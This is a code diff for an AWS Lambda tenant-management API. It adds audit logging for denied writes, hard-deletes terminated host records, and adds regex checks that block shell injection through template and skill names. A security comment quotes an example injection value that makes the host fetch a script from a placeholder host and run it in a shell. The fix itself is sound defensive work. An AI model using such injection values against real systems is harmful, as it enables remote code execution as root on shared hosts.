@@ -1,12 +1,13 @@
 # Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
 # SPDX-License-Identifier: MIT-0
 
-import json
 import hashlib
+import json
 import os
 import random
 import re
 import time
+
 import boto3
 from botocore.exceptions import ClientError
 
@@ -84,8 +85,8 @@ COGNITO_REGION = os.environ.get("AWS_REGION", "") or os.environ.get("AWS_DEFAULT
 # "viewer" = least privilege (fail-safe). Trusted automation that needs write
 # access must present a Cognito id_token.
 DEFAULT_NO_JWT_ROLE = os.environ.get("DEFAULT_NO_JWT_ROLE", "viewer")
-# RBAC role-gating is its own switch, independent of console_auth (Cognito login). 
-# Default OFF: login can be required for the console UI without forcing every write to carry a Cognito id_token. 
+# RBAC role-gating is its own switch, independent of console_auth (Cognito login).
+# Default OFF: login can be required for the console UI without forcing every write to carry a Cognito id_token.
 # Set RBAC_ENABLED=true to enforce per-route role checks (viewer/operator/admin).
 RBAC_ENABLED = os.environ.get("RBAC_ENABLED", "false").lower() == "true"
 
@@ -615,6 +616,13 @@ def lambda_handler(event, context):
     # RBAC enforcement — checked AFTER routing so unknown paths still 404.
     forbidden = _rbac_check(event, method, resource)
     if forbidden is not None:
+        # Audit DENIED mutating attempts (issue-audit-6): _rbac_check returns
+        # the 403 before the handler runs, so without this an unauthorized
+        # write (e.g. a viewer trying DELETE /tenants/{id}) left NO trace —
+        # exactly the event incident response most wants. Reuse _audit_write so
+        # the row carries the real principal + resolved role + 403 status.
+        if method in ("POST", "PUT", "DELETE"):
+            _audit_write(method, resource, path_params, event, forbidden)
         return forbidden
     try:
         result = handler() if callable(handler) else handler
@@ -683,6 +691,14 @@ def create_tenant(body=None):
         return _resp(400, {"error": quota_err})
 
     config_template = body.get("config_template", "")
+    # SECURITY: config_template is interpolated verbatim into the root SSM
+    # command that launches the VM (_launch_vm → launch-vm.sh arg 5). It MUST
+    # be a bare template name, never shell metacharacters — otherwise a request
+    # like config_template="x; curl evil|sh #" is arbitrary root RCE on a
+    # shared host. Same allow-list as skill names (both are S3 subdir names).
+    if config_template and not _SKILL_NAME_RE.match(config_template):
+        return _resp(400, {"error": "config_template must match "
+                                    "^[a-z0-9]([a-z0-9-]{0,62}[a-z0-9])?$"})
     restore_from = body.get("restore_from")
     clone_from = body.get("clone_from")
 
@@ -693,6 +709,13 @@ def create_tenant(body=None):
         if not isinstance(skills_in, list) or not all(isinstance(s, str) for s in skills_in):
             return _resp(400, {"error": "skills must be a list of strings"})
         skills_in = sorted(set(s.strip() for s in skills_in if s and s.strip()))
+        # SECURITY: each skill name is joined into the same root SSM command
+        # (launch-vm.sh arg 7, comma-separated). Reject metacharacters — same
+        # command-injection vector as config_template above.
+        bad = [s for s in skills_in if not _SKILL_NAME_RE.match(s)]
+        if bad:
+            return _resp(400, {"error": f"invalid skill name(s): {bad} — must match "
+                                        "^[a-z0-9]([a-z0-9-]{0,62}[a-z0-9])?$"})
     group_in = (body.get("group") or "").strip()
     if group_in and not _NAME_RE.match(group_in):
         return _resp(400, {"error": "group must match ^[a-z0-9]([a-z0-9-]{0,30}[a-z0-9])?$"})
@@ -1465,13 +1488,12 @@ def cleanup_terminated_host(event):
     # Remove host target group
     _remove_host_tg(instance_id)
 
-    # Delete host
-    hosts_table.update_item(
-        Key={"instance_id": instance_id},
-        UpdateExpression="SET #s = :s, updated_at = :t",
-        ExpressionAttributeNames={"#s": "status"},
-        ExpressionAttributeValues={":s": "deleted", ":t": _now()},
-    )
+    # Hard-delete the host row. A soft "status=deleted" left every terminated
+    # instance behind forever (161 zombie rows observed live); register_host
+    # creates a FRESH row per new instance_id, so there is nothing to preserve.
+    # Every _find_host / failover / scaler scan previously paid RCU + latency to
+    # read all those dead rows. Its tenants are already reaped above.
+    hosts_table.delete_item(Key={"instance_id": instance_id})
     print(f"cleaned up host {instance_id}, {len(tenants)} tenants deleted")
 
     # Issue #71 — audit the host teardown + tenant reap (non-API actor).
@@ -2400,7 +2422,8 @@ def _audit_system(event_name, obj, resource_id, actor="system", detail=None, sta
     if audit_table is None:
         return
     try:
-        import uuid, time as _t
+        import time as _t
+        import uuid
         item = {
             "pk": "audit",
             "id": str(uuid.uuid4()),
@@ -2427,7 +2450,8 @@ def _audit_write(method, resource, path_params, event, result):
     if audit_table is None:
         return
     try:
-        import uuid, time as _t
+        import time as _t
+        import uuid
         path_params = path_params or {}
         obj, resource_id = _audit_object(resource, path_params)
         api_key_id = (event.get("requestContext") or {}).get("identity", {}).get("apiKeyId") \
